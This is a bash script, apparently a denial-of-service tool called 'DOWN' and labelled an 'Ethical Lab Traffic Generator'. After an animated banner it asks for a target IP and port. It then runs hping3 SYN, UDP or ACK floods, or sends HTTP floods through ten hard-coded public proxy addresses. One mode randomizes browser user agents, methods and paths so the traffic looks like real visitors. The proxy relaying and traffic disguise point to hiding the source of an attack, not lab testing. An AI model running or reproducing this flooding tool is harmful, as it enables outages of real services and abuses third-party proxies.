#!/bin/bash

# --- Animated Banner Function ---
display_banner() {
    # ANSI helpers
    CSI="\e["
    RESET="${CSI}0m"
    BOLD="${CSI}1m"

    fg256() { printf "${CSI}38;5;%sm" "$1"; }
    bg256() { printf "${CSI}48;5;%sm" "$1"; }

    cols=$(tput cols 2>/dev/null || echo 80)

    center_print() {
      local s="$1"
      local len=${#s}
      if [ "$cols" -gt "$len" ]; then
        local pad=$(( (cols - len) / 2 ))
        printf "%*s%s\n" "$pad" "" "$s"
      else
        printf "%s\n" "$s"
      fi
    }

    # Smooth reveal helper
    reveal_line() {
      local text="$1"
      local delay=${2:-0.004}
      local i ch
      for ((i=0; i<${#text}; i++)); do
        ch="${text:$i:1}"
        printf "%s" "$ch"
        sleep "$delay"
      done
      printf "\n"
    }

    # Large "DOWN" wordmark (6 lines)
WORDMARK=(
"███████╗  ██████╗ ██╗    ██╗███╗   ██╗"
" ██╔══██╗██╔═══██╗██║    ██║████╗  ██║"
" ██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║"
" ██║  ██║██║   ██║██║███╗██║██║╚██╗██║"
"███████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║"
"╚══════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝"
)

    # Palette for gradient effect
    PALETTE=(51 39 117 81 46 82)

    clear
    printf "\n"

    # Reveal the wordmark with gradient cycling
    for i in "${!WORDMARK[@]}"; do
      color="${PALETTE[$(( i % ${#PALETTE[@]} ))]}"
      fg256 "$color"
      center_print "${WORDMARK[$i]}"
      printf "$RESET"
      sleep 0.06
    done

    # Subtitle: typed reveal
    printf "\n"
    subtitle="No Mercy — Ethical Lab Traffic Generator"
    leftpad=$(( (cols - ${#subtitle}) / 2 ))
    printf "%*s" "$leftpad" ""
    fg256 39
    reveal_line "$subtitle" 0.006
    printf "$RESET\n"

    # Warmup spinner (short)
    printf " Initializing"
    spinner_chars='|/-\'
    for i in {1..16}; do
      printf "\r Initializing %s " "${spinner_chars:i%4:1}"
      sleep 0.06
    done
    printf "\r"
    printf " Initializing ... Done\n\n"
}

# --- Main Script ---
display_banner

echo "=== Advanced Flood Test Tool with Proxy Support ==="

# Get user input
read -p "Enter target IP [127.0.0.1]: " ip
ip=${ip:-127.0.0.1}

read -p "Enter target port [80]: " port
port=${port:-80}

read -p "Enter packet count [1000]: " count
count=${count:-1000}

# Protocol selection
echo ""
echo "Select flood type:"
echo "1) TCP SYN Flood"
echo "2) UDP Flood"
echo "3) TCP ACK Flood"
echo "4) HTTP Flood through Proxies"
echo "5) Mixed Browser Traffic through Proxies"
read -p "Choose [1-5]: " protocol

echo ""
echo "Starting test..."
echo "Target: $ip:$port"
echo "Packets: $count"

# List of 10 free web proxies
PROXIES=(
    "51.158.68.133:8811"
    "185.199.229.156:7492"
    "185.199.228.220:7300"
    "185.199.231.45:8382"
    "188.166.233.149:8118"
    "178.62.193.19:8080"
    "165.227.36.231:80"
    "159.65.133.175:3128"
    "68.183.202.76:80"
    "206.189.146.13:8080"
)

case $protocol in
  1)
    echo "Type: TCP SYN Flood"
    hping3 -S -p $port -c $count --flood $ip
    ;;
  2)
    echo "Type: UDP Flood"
    hping3 -2 -p $port -c $count --flood $ip
    ;;
  3)
    echo "Type: TCP ACK Flood"
    hping3 -A -p $port -c $count --flood $ip
    ;;
  4)
    echo "Type: HTTP Flood through 10 Proxies"
    echo "Using ${#PROXIES[@]} different proxies..."
    
    requests_per_proxy=$((count / ${#PROXIES[@]}))
    echo "Sending $requests_per_proxy requests per proxy..."
    
    for proxy in "${PROXIES[@]}"; do
        proxy_ip=$(echo $proxy | cut -d: -f1)
        proxy_port=$(echo $proxy | cut -d: -f2)
        
        echo "Using proxy: $proxy_ip:$proxy_port"
        
        for ((i=1; i<=requests_per_proxy; i++)); do
            {
                echo -e "GET http://$ip:$port/ HTTP/1.1\r\nHost: $ip\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: close\r\n\r\n" | \
                nc $proxy_ip $proxy_port 2>/dev/null &
            } 2>/dev/null
            sleep 0.1
        done
    done
    wait
    ;;
    
  5)
    echo "Type: Mixed Browser Traffic through Proxies"
    echo "Simulating real browser traffic through ${#PROXIES[@]} proxies..."
    
    # Different user agents to simulate real browsers
    USER_AGENTS=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0"
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1"
    )
    
    # Different HTTP methods and paths
    HTTP_METHODS=("GET" "POST" "HEAD")
    PATHS=("/" "/index.html" "/api/v1/test" "/images/logo.png" "/css/style.css")
    
    requests_per_proxy=$((count / ${#PROXIES[@]} / 3))
    
    for proxy in "${PROXIES[@]}"; do
        proxy_ip=$(echo $proxy | cut -d: -f1)
        proxy_port=$(echo $proxy | cut -d: -f2)
        
        echo "Proxy $proxy_ip:$proxy_port - $requests_per_proxy requests"
        
        for ((i=1; i<=requests_per_proxy; i++)); do
            {
                # Randomize request parameters
                method=${HTTP_METHODS[$RANDOM % ${#HTTP_METHODS[@]}]}
                path=${PATHS[$RANDOM % ${#PATHS[@]}]}
                user_agent=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
                
                if [ "$method" == "GET" ]; then
                    echo -e "GET http://$ip:$port$path HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agent\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nConnection: close\r\n\r\n"
                elif [ "$method" == "POST" ]; then
                    echo -e "POST http://$ip:$port$path HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agent\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 11\r\nConnection: close\r\n\r\ndata=test$i"
                else
                    echo -e "HEAD http://$ip:$port$path HTTP/1.1\r\nHost: $ip\r\nUser-Agent: $user_agent\r\nConnection: close\r\n\r\n"
                fi | nc $proxy_ip $proxy_port 2>/dev/null &
            } 2>/dev/null
            sleep 0.2
        done
    done
    wait
    ;;
    
  *)
    echo "Invalid selection. Using TCP SYN Flood."
    hping3 -S -p $port -c $count --flood $ip
    ;;
esac

echo "Test completed."
